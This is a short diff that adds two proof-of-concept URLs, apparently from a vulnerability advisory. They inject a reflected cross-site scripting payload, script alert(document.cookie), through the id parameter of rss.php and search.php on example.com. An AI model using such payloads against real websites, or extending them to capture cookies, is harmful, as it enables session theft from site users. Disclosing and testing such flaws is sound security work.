@@ -1,0 +1,2 @@
+  http://www.example.com/rss.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+  http://www.example.com/search.php?id=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
